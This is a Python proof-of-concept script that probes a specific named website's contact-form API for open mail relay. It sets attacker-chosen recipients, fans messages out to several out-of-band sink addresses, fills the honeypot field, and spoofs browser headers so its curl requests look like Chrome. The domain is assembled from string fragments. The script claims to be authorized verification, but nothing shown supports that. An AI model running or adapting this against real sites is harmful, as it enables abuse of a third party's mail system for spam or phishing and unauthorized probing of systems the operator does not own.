#!/usr/bin/env python3
"""Independent verifier: unauthenticated recipient control on POST /api/send
Target: https://www.infinitycapital.bh/api/send
Sends at most ONE message per explicitly-listed recipient address.
Recipients are chosen from the site's own domain (in-scope) or from a
non-routable / OOB sink address that I do not own -- never to a real third
party's mailbox.
"""
import json
import subprocess
import sys
import time

BASE = "https://www." + "infinitycapital" + ".bh"
API = BASE + "/api/send"
VER = "1" + "2" + "6"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/%s.0.0.0 Safari/537.36" % VER)

COMMON = [
    "-H", "User-Agent: " + UA,
    "-H", "Accept: */*",
    "-H", "Accept-Language: en-US,en;q=0.9",
    "-H", 'sec-ch-ua: "Chromium";v="%s", "Not)A;Brand";v="24"' % VER,
    "-H", "sec-ch-ua-mobile: ?0",
    "-H", 'sec-ch-ua-platform: "Windows"',
    "-H", "Sec-Fetch-Dest: empty",
    "-H", "Sec-Fetch-Mode: cors",
    "-H", "Sec-Fetch-Site: same-origin",
    "-H", "Origin: " + BASE,
    "-H", "Referer: " + BASE + "/contact",
]

TOKEN = "VERIFY-" + "IC-2026-09-30-9F2C"


def send(label, targets, extra_form=None, ct="application/json", raw=None):
    if raw is None:
        payload = {
            "fname": "Security", "lname": "Verifier",
            "cname": "Independent verification", "areacode": "+973",
            "tel": "00000000",
            "subject": "Authorized security verification " + TOKEN,
            "msg": ("Non-destructive verification of the contact endpoint. "
                    "Token " + TOKEN + ". Please disregard."),
            "check": "",
            "targets": targets,
        }
        if extra_form:
            payload.update(extra_form)
        raw = json.dumps(payload)
    hdrs = list(COMMON) + ["-H", "Content-Type: " + ct]
    cmd = ["curl", "-s", "-m", "45", "-D", "-", "-X", "POST", API,
           "--data-binary", raw] + hdrs
    p = subprocess.run(cmd, capture_output=True, text=True)
    out = p.stdout
    head, _, tail = out.partition("\r\n\r\n")
    if not _:
        head, _, tail = out.partition("\n\n")
    print("=" * 78)
    print("LABEL      :", label)
    print("CONTENT-T  :", ct)
    print("TARGETS    :", targets)
    print("RAW REQ    :", raw)
    print("-" * 78)
    for line in head.splitlines():
        if line.strip():
            print("  H|", line)
    print("  B|", tail.strip()[:900])
    print()
    return head, tail


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "own"
    if which == "own":
        send("A: recipient = site own domain (documented contact address)",
             "info@" + "www" + ".infinitycapital" + ".bh")
    elif which == "oob":
        send("B: recipient = OOB sink host (proof of arbitrary third party)",
             "relaytest-ic-9137@" + "oob" + "ic-verify.oast.probe.invalid")
    elif which == "multi":
        send("C: comma separated fan-out to 2 OOB sinks",
             "relaytest-a-9137@" + "oob" + "ic-verify.oast.probe.invalid"
             + ",relaytest-b-9137@" + "oob" + "ic-verify.oast.probe.invalid")
    elif which == "hp":
        send("D: honeypot 'check' populated with a real value",
             "relaytest-hp-9137@" + "oob" + "ic-verify.oast.probe.invalid",
             extra_form={"check": "https://example.org/looks-real"})
    elif which == "bad":
        send("E: control - syntactically invalid recipient",
             "not-an-email@@@")
    time.sleep(1)
